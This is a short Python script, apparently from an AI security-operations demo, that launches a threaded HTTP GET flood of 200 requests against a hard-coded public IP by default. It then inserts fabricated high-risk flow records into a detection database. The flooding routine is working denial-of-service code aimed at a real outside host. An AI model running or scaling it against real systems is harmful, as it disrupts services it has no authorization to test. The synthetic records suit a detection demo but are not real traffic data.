import threading
import socket
import time
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.logger import get_logger

log = get_logger(__name__)

def run(target_ip="93.184.215.14", target_port=80, requests=200): # example.com
    print("\n=======================================================")
    print("   AI-SOC Demo: HTTP DDoS Flood Attack")
    print("=======================================================\n")
    log.warning(f"🔴 [ATTACK] Launching HTTP Flood against {target_ip}:{target_port} ({requests} requests)...")
    
    import random
    def send_req():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2.0)
                s.connect((target_ip, target_port))
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        except (socket.timeout, ConnectionRefusedError):
            pass
            
        # Log to DB
        try:
            from live_capture.database import insert_flow
            from demo.demo_live_data_generator import generate_features
            insert_flow(
                src_ip="10.0.0.15", src_port=random.randint(50000, 60000),
                dst_ip=target_ip, dst_port=target_port,
                protocol="6",
                risk_score=random.uniform(88.0, 99.5),
                risk_label="Critical",
                predicted_attack="HTTP_DDoS",
                confidence=random.uniform(0.80, 0.95),
                features=generate_features(is_attack=True)
            )
        except Exception:
            pass

    threads = []
    for _ in range(requests):
        t = threading.Thread(target=send_req)
        threads.append(t)
        t.start()
        time.sleep(0.005)

    for t in threads:
        t.join()
        
    log.info("✅ HTTP Flood simulation complete.")

if __name__ == "__main__":
    run()
